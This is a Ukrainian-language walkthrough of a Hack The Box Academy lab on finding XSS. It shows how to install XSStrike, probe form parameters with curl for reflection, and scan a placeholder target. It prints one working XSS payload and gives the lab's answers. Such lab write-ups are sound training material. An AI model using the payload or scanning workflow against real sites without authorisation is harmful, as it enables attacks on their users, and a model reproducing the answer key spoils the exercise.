## XSS Discovery

**Модуль:** [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/app/module/103)
**Секція:** [XSS Discovery](https://academy.hackthebox.com/app/module/103/section/982)
**Q1:** `email` | **Q2:** `Reflected`

***

## Крок 1 — Встановлення XSStrike через venv

`pip install` в Kali заблокований системою (PEP 668) — використовуємо virtual environment:

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
python3 -m venv ~/XSStrike/venv
source ~/XSStrike/venv/bin/activate
pip install -r requirements.txt
```

Деактивація після роботи:
```bash
deactivate
```

> **Чому не `pipx install xsstrike`:** `pipx` встановлює з PyPI пакет `xsstrike 3.2.2`, але він не є повноцінним клоном репозиторію — запуск `python xsstrike.py` потребує саме клон. `pipx` — для системних утиліт, `venv` — для локальних скриптів.

***

## Крок 2 — Розвідка форми через curl

Перед запуском XSStrike — дізнаємось які параметри є на сторінці:

```bash
curl -s http://TARGET_IP:TARGET_PORT/index.php | grep -iE "form|input|action|name="
```

**Результат:** форма з методом `GET`, параметри: `fullname`, `username`, `password`, `email`.

Перевіряємо відбиття кожного параметра:
```bash
curl -s "http://TARGET_IP:TARGET_PORT/index.php?fullname=TESTXSS" | grep -i "TESTXSS"
curl -s "http://TARGET_IP:TARGET_PORT/index.php?username=TESTXSS" | grep -i "TESTXSS"
curl -s "http://TARGET_IP:TARGET_PORT/index.php?password=TESTXSS" | grep -i "TESTXSS"
curl -s "http://TARGET_IP:TARGET_PORT/index.php?email=TESTXSS" | grep -i "TESTXSS"
```

> Якщо curl нічого не повертає — параметр не відбивається (не вразливий). Якщо є вивід — кандидат на XSS.

***

## Крок 3 — Запуск XSStrike з усіма параметрами

**Помилка початківця:** запускати XSStrike з одним параметром (`?email=test`) — він не знайде вразливість, бо форма потребує всіх полів одночасно.

**Правильна команда — всі параметри разом:**

```bash
source ~/XSStrike/venv/bin/activate

python xsstrike.py -u \
  "http://TARGET_IP:TARGET_PORT/index.php?fullname=test&username=test&password=test&email=test"
```

**Результат:**
```
[!] Testing parameter: fullname → No reflection found
[!] Testing parameter: username → No reflection found
[!] Testing parameter: password → No reflection found
[!] Testing parameter: email    → Reflections found: 1
[+] Payload: <D3v%0dONpoiNTeRenTer%0d=%0d[8].find(confirm)>
[!] Efficiency: 100
[!] Confidence: 10
```

XSStrike підтверджує: вразливий параметр — **`email`**, тип — **Reflected XSS**.

***

## Відповіді

| Питання | Відповідь |
|---|---|
| Q1: Вразливий параметр | `email` |
| Q2: Тип XSS | `Reflected` |

***

## Ключові висновки

- **`venv` замість `pip install` системно** — стандарт для Kali Python 3.12+
- **Передавай всі параметри форми** в URL — XSStrike тестує кожен окремо, але форма може вимагати їх наявність для рендерингу відповіді
- **`curl | grep`** — швидкий ручний спосіб знайти параметри з відбиттям до запуску автоматики

***
